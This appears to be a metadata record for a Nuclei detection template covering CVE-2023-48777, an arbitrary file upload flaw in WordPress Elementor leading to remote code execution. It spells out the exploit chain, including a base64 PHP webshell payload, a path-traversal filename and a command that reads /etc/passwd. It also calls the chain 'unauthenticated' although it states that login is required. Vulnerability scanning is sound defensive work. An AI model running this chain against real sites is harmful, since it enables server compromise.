---
cve_id: CVE-2023-48777
template_path: nuclei-templates/http/cves/2023/CVE-2023-48777.yaml
affected_product: WordPress Elementor plugin
severity: critical
authentication: required
external_callback: false
affected_versions: <= 3.18.1
preconditions: [contributor-level access and above]
poc_classification: rce
---

## Vulnerability
WordPress Elementor plugin (website_builder component) contains an arbitrary file upload vulnerability in the template import functionality (CWE-434) that leads to remote code execution. Authenticated attackers with contributor-level access and above can import a malicious template containing a path-traversed PHP file (e.g., ../../../../random.php) with base64-encoded webshell code that executes system commands via $_GET['cmd']. Impact: full server compromise (CVSS 9.9, AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H). Fixed in 3.18.2.

## PoC / Detection
Classification: rce
The template executes the full unauthenticated-to-RCE chain (intrusive) to confirm exploitability:  
- POST /wp-login.php with supplied username/password to authenticate.  
- GET /wp-admin/post.php?post=1&action=elementor to load the editor and regex-extract the Elementor nonce from the response body.  
- POST /wp-admin/admin-ajax.php with url-encoded payload `{"import_template":{"action":"import_template","data":{"fileName":"/../../../../{{rand_base(6)}}.php","fileData":"PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4="}}}` using the nonce to trigger the vulnerable import_template action and drop the webshell in /wp-content/.  
- GET /wp-content/{{random}}.php?cmd=cat+/etc/passwd and match `regex('root:.*:0:0:', body)` + status 200 to verify command execution succeeded.

## References
- https://wpscan.com/vulnerability/a6b3b14c-f06b-4506-9b88-854f155ebca9/
- https://patchstack.com/database/vulnerability/elementor/wordpress-elementor-plugin-3-18-0-arbitrary-file-upload-vulnerability?_s_id=cve
